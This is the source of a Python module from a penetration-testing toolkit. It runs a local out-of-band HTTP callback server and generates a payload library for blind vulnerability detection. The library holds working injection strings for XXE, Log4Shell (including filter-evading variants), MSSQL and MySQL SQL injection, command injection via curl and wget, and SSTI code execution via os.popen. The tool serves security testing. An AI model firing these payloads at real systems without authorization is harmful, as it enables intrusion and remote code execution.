"""
modules/oob_server.py
tmrswrr - OOB (Out-of-Band) Callback Server
Local HTTP server for blind vulnerability detection (SQLi, SSRF, XXE, CMDi, Log4Shell)
"""
import json
import os
import socket
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

from config.settings import OUTPUT_DIR, SESSION, save_session
from utils.helpers import (
    BOLD,
    NEON_CYN,
    NEON_GRN,
    NEON_RED,
    NEON_YEL,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    pause,
    print_banner,
    prompt,
    section,
    success,
    warn,
)


def _out(name):
    d = str(OUTPUT_DIR); os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


# Global hit log
_HIT_LOG: list[dict] = []
_SERVER:  HTTPServer | None = None
_SERVER_THREAD: threading.Thread | None = None


class OOBHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        entry = {
            "time":    time.strftime("%Y-%m-%d %H:%M:%S"),
            "method":  "GET",
            "path":    self.path,
            "client":  self.client_address[0],
            "headers": dict(self.headers),
        }
        _HIT_LOG.append(entry)
        print(f"\n  {NEON_RED}{BOLD}[OOB HIT]{RST}  {NEON_GRN}{entry['client']}{RST}  "
              f"{NEON_CYN}{entry['path']}{RST}  {SOFT_WHITE}{entry['time']}{RST}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length).decode("utf-8", errors="replace") if length else ""
        entry = {
            "time":    time.strftime("%Y-%m-%d %H:%M:%S"),
            "method":  "POST",
            "path":    self.path,
            "client":  self.client_address[0],
            "body":    body[:500],
            "headers": dict(self.headers),
        }
        _HIT_LOG.append(entry)
        print(f"\n  {NEON_RED}{BOLD}[OOB POST HIT]{RST}  {NEON_GRN}{entry['client']}{RST}  "
              f"{NEON_CYN}{entry['path']}{RST}  body: {body[:100]}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        pass  # Suppress default logging - we handle it above


def start_server(port: int = 8877) -> tuple[str, int]:
    """Start OOB HTTP server in background. Returns (ip, port)."""
    global _SERVER, _SERVER_THREAD
    if _SERVER:
        return _get_local_ip(), port

    try:
        _SERVER = HTTPServer(("0.0.0.0", port), OOBHandler)
        _SERVER_THREAD = threading.Thread(target=_SERVER.serve_forever, daemon=True)
        _SERVER_THREAD.start()
        ip = _get_local_ip()
        success(f"OOB server started: http://{ip}:{port}/")
        return ip, port
    except OSError as e:
        if "Address already in use" in str(e):
            warn(f"Port {port} in use - trying {port+1}")
            return start_server(port + 1)
        raise


def stop_server():
    global _SERVER
    if _SERVER:
        _SERVER.shutdown()
        _SERVER = None
        info("OOB server stopped")


def show_hits():
    if not _HIT_LOG:
        info("No OOB hits received yet")
        return
    print(f"\n  {NEON_GRN}OOB Hits ({len(_HIT_LOG)}):{RST}")
    for i, hit in enumerate(_HIT_LOG, 1):
        print(f"  {NEON_CYN}[{i}]{RST} {hit['time']}  "
              f"{NEON_GRN}{hit['client']}{RST}  "
              f"{NEON_YEL}{hit['method']}{RST}  "
              f"{hit['path'][:60]}")
        if "headers" in hit:
            ua = hit["headers"].get("User-Agent", "")
            if ua:
                print(f"       UA: {ua[:80]}")


def generate_payloads(ip: str, port: int):
    section("OOB PAYLOAD LIBRARY")
    base = f"http://{ip}:{port}"
    token = str(int(time.time()))[-6:]

    payloads = {
        "SSRF": [
            f"{base}/ssrf-{token}",
            f"{base}/ssrf-probe",
        ],
        "XXE": [
            f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{base}/xxe-{token}">]>
<root>&xxe;</root>""",
            f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{base}/xxe-oob-{token}"> %xxe;]>
<foo></foo>""",
        ],
        "Log4Shell (CVE-2021-44228)": [
            f"${{jndi:ldap://{ip}:{port}/log4shell-{token}}}",
            f"${{${{lower:j}}ndi:${{lower:ldap}}://{ip}:{port}/log4j}}",
            f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{ip}:{port}/ls}}",
        ],
        "Blind SQLi (DNS)": [
            f"'; EXEC master..xp_dirtree '//{ip}/sqli-{token}'; --",
            f"1 AND LOAD_FILE('{base}/sqli-{token}')",
            f"1 UNION SELECT LOAD_FILE('{base}/sqli-{token}')--",
        ],
        "Blind CMDi": [
            f"curl {base}/cmdi-{token}",
            f"wget {base}/cmdi-{token}",
            f"ping -c 1 {ip}",
            f"nslookup {ip}",
        ],
        "SSTI OOB": [
            f"{{{{config.__class__.__init__.__globals__['os'].popen('curl {base}/ssti-{token}').read()}}}}",
        ],
        "Deserialization": [
            f"http://{ip}:{port}/deser-{token}",
        ],
    }

    print()
    for vuln_type, plist in payloads.items():
        print(f"  {NEON_GRN}{BOLD}── {vuln_type} ──{RST}")
        for p in plist:
            print(f"  {NEON_CYN}{p}{RST}")
        print()

    # Save
    out_file = _out(f"oob_payloads_{token}.txt")
    with open(out_file, "w") as f:
        for vuln_type, plist in payloads.items():
            f.write(f"\n# {vuln_type}\n")
            for p in plist:
                f.write(p + "\n")
    success(f"Payloads saved → {out_file}")


def monitor_mode(ip: str, port: int):
    section("OOB MONITOR - Waiting for callbacks...")
    info(f"Server: http://{ip}:{port}/")
    info("Listening for incoming OOB connections...")
    info("Press Ctrl+C to stop")
    print()
    start_count = len(_HIT_LOG)
    try:
        while True:
            time.sleep(1)
            current = len(_HIT_LOG)
            if current > start_count:
                # Show new hits
                for hit in _HIT_LOG[start_count:]:
                    pass  # Already printed by handler
                start_count = current
    except KeyboardInterrupt:
        print()
        info("Monitor stopped")


def interactsh_setup():
    """Start (or show) the shared collaborator every blind check uses."""
    section("OOB COLLABORATOR")
    from utils.oob import get_collaborator

    oob = get_collaborator(required=True)
    if oob is not None:
        success(f"Collaborator active: {oob.describe()}")
        info("Blind SSRF, XXE and command-injection checks now confirm themselves "
             "against it automatically - no need to paste a URL into each one.")
        hits = oob.hits()
        info(f"{len(hits)} interaction(s) recorded so far.")
        for hit in hits[-5:]:
            print(f"  {NEON_GRN}{hit.get('protocol', '?').upper()}{RST} "
                  f"{hit.get('remote-address', '?')} → {hit.get('full-id', '')}")
        return

    print(f"""
  {NEON_CYN}No collaborator could be started. Install interactsh for public OOB
  (no port forwarding needed):{RST}

  {NEON_GRN}Go install:{RST}
    go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

  {NEON_GRN}Usage:{RST}
    interactsh-client              # Get a unique URL like abc123.oast.fun
    interactsh-client -v           # Verbose - shows all hits live

  {NEON_GRN}Then use the URL in your payloads:{RST}
    SSRF:     ?url=http://abc123.oast.fun/ssrf
    XXE:      SYSTEM "http://abc123.oast.fun/xxe"
    Log4Shell: ${{jndi:ldap://abc123.oast.fun/ls}}
    CMDi:     ; curl http://abc123.oast.fun/cmdi

  {NEON_GRN}Alternative public OOB services:{RST}
    https://app.interactsh.com  (web)
    https://requestbin.com
    https://webhook.site
    pingb.in (DNS-based)
""")


def run():
    print_banner("OOB CALLBACK SERVER", "tmrswrr - Blind Vulnerability Detection")

    ip, port = _get_local_ip(), 8877
    server_running = _SERVER is not None

    while True:
        status = f"{NEON_GRN}RUNNING on {ip}:{port}{RST}" if server_running else f"{NEON_RED}STOPPED{RST}"
        hits = len(_HIT_LOG)
        print(f"""
  {NEON_GRN}Server:{RST} {status}
  {NEON_GRN}Hits:{RST}   {PURE_WHITE}{hits} callbacks received{RST}

  {NEON_CYN}[1]{RST} Start OOB Server     {SOFT_WHITE}(local HTTP listener for blind vulns){RST}
  {NEON_CYN}[2]{RST} Generate Payloads    {SOFT_WHITE}(SSRF, XXE, Log4Shell, SQLi, CMDi){RST}
  {NEON_CYN}[3]{RST} Monitor Mode         {SOFT_WHITE}(watch for incoming callbacks){RST}
  {NEON_CYN}[4]{RST} Show Hits Log        {SOFT_WHITE}(all received callbacks){RST}
  {NEON_CYN}[5]{RST} Stop Server
  {NEON_CYN}[6]{RST} Collaborator Status  {SOFT_WHITE}(interactsh - auto-used by blind checks){RST}
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0": break
        elif c == "1":
            ip, port = start_server()
            server_running = True
            SESSION["_oob_url"] = f"http://{ip}:{port}"
            save_session()
        elif c == "2":
            if not server_running:
                ip, port = start_server()
                server_running = True
            generate_payloads(ip, port)
        elif c == "3":
            if not server_running:
                ip, port = start_server()
                server_running = True
            monitor_mode(ip, port)
        elif c == "4":
            show_hits()
            if _HIT_LOG:
                out_file = _out("oob_hits.json")
                with open(out_file, "w") as f:
                    json.dump(_HIT_LOG, f, indent=2)
                success(f"Hits saved → {out_file}")
        elif c == "5":
            stop_server()
            server_running = False
        elif c == "6":
            interactsh_setup()
        pause()
